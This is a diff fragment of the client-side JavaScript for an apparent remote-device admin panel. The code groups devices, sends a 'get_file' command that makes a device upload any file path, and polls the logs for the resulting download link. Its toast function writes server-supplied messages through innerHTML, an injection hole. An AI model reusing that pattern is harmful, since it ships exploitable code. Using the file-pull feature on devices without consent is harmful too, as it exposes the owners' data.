+                } else {
+                    if (res.status === 403) {
+                        const err = document.getElementById('errorMsg');
+                        err.innerText = res.body.message || "密码错误";
+                        err.style.display = "block";
+                    } else {
+                        throw new Error(res.body.message || "Unknown error");
+                    }
+                }
+            })
+            .catch(err => {
+                showToast(err.message, "error");
+            });
+        }
+
+        function submitBatchMove() {
+            const selected = getSelectedIds();
+            const type = document.querySelector('input[name="groupTargetType"]:checked').value;
+            let groupName = (type === 'existing') ? 
+                document.getElementById('batchGroupSelect').value : 
+                document.getElementById('batchGroupInput').value;
+
+            if (!groupName) {
+                showToast("请提供有效的分组名称", "error");
+                return;
+            }
+
+            fetch('/admin/batch_group', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_ids: selected, group_name: groupName })
+            })
+            .then(res => res.json())
+            .then(data => {
+                showToast(`已移动 ${data.count} 台设备`, "success");
+                closeModal('moveGroupModal');
+                setTimeout(() => location.reload(), 1000);
+            })
+            .catch(err => showToast("操作失败: " + err, "error"));
+        }
+
+        function downloadFile(path) {
+            // Send get_file command to device
+            fetch('/admin/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    device_ids: [currentFileDeviceId],
+                    action: 'get_file',
+                    payload: path
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                showToast("已发送下载请求，请稍后在日志中查看下载链接", "info");
+                // Poll for result
+                pollDownloadResult(path);
+            })
+            .catch(err => {
+                showToast("请求失败: " + err, "error");
+            });
+        }
+
+        function pollDownloadResult(path) {
+            let attempts = 0;
+            const maxAttempts = 20; // 20 * 2s = 40s timeout
+            const interval = setInterval(() => {
+                attempts++;
+                if (attempts > maxAttempts) {
+                    clearInterval(interval);
+                    showToast("下载超时，请手动检查日志", "error");
+                    return;
+                }
+
+                fetch(`/admin/logs?device_id=${currentFileDeviceId}`)
+                .then(res => res.json())
+                .then(logs => {
+                    if (!logs) return;
+                    // Look for successful upload matching the path
+                    const log = logs.find(l => 
+                        l.action === 'get_file' && 
+                        new Date(l.created_at).getTime() > (Date.now() - 60000) &&
+                        (l.result.includes("Upload successful") || l.result.startsWith("http"))
+                    );
+
+                    if (log) {
+                        clearInterval(interval);
+                        // Extract URL
+                        // Result format: "Upload successful: http://.../uploads/..." or just URL
+                        let url = "";
+                        if (log.result.includes("http")) {
+                            const match = log.result.match(/http\S+/);
+                            if (match) url = match[0];
+                        }
+                        
+                        if (url) {
+                            showToast("文件已就绪，正在下载...", "success");
+                            window.open(url, '_blank');
+                        } else {
+                            showToast("下载失败: " + log.result, "error");
+                        }
+                    }
+                });
+            }, 2000);
+        }
+
+        // --- Toast ---
+        function showToast(message, type = "success") {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `<span>${message}</span>`;
+            
+            container.appendChild(toast);
+            
+            // Trigger reflow
+            void toast.offsetWidth; 
+            toast.classList.add('show');
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal-overlay')) {
+                event.target.classList.remove('active');
+            }
+        }
+    </script>
+</body>
+</html>
